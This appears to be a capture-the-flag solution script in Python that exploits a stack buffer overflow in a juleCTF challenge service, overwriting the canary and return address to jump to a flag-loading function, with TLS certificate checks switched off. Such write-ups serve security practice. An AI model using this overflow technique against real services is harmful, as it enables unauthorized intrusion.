import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40
LOAD_FLAG = 0x401b72

# Simple payload: overflow -> canary -> fake rbp -> return to load_flag_to_location
# When greet_user returns, rdi should contain the socket FD
payload = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8  # Fake saved RBP
    + (LOAD_FLAG).to_bytes(8, "little")
)

raw = socket.create_connection((HOST, PORT), timeout=5)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(raw, server_hostname=HOST)

# Send length
s.sendall(str(len(payload)).encode() + b"\n")

# Wait for prompt
buf = b""
s.settimeout(3.0)
while True:
    chunk = s.recv(1024)
    if not chunk: break
    buf += chunk
    if b"what is your name?" in buf:
        break

# Send payload
print("Sending payload...")
s.sendall(payload)
time.sleep(1)

# Navigate to LOC_SLEIGH: 3 -> 1
print("Navigating to LOC_SLEIGH...")
s.sendall(b"3\n")
time.sleep(0.3)
s.sendall(b"1\n")

# Read output
print("\n=== OUTPUT ===")
s.settimeout(3.0)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        output = chunk.decode(errors='replace')
        print(output, end='')
        if "JUL{" in output or "juleCTF{" in output:
            print("\n\n*** FLAG FOUND! ***")
except:
    pass

s.close()
